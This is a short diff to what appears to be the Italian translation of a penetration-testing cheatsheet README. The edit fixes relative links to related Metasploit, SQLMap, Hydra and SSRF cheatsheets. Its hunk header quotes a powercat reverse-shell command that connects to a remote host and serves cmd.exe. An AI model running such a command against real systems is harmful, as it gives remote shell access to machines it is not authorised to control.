@@ -276,10 +276,10 @@ powercat -c 10.10.10.10 -p 4444 -e cmd.exe
 
 ## 🔗 Cheatsheet Correlati
 
-- [Metasploit](../Metasploit/translations/README.it.md)
-- [SQLMap](../SQLMap/translations/README.it.md)
-- [Hydra](../Hydra/translations/README.it.md)
-- [Web Vulnerabilities](../SSRF/translations/README.it.md)
+- [Metasploit](../../Metasploit/README.md)
+- [SQLMap](../../SQLMap/README.md)
+- [Hydra](../../Hydra/README.md)
+- [Web Vulnerabilities](../../SSRF/README.md)
 
 ---
 
